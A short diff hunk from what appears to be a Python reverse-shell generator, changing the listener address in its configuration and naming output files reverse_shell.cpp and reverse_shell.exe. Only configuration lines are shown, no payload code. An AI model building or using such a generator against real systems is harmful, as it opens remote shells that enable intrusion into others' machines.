@@ -3,7 +3,7 @@ import sys
 import subprocess
 
 # Configuration
-LHOST = "192.168.1.182"
+LHOST = "192.168.1.000"
 LPORT = 4545
 OUTPUT_CPP = "reverse_shell.cpp"
 OUTPUT_EXE = "reverse_shell.exe"
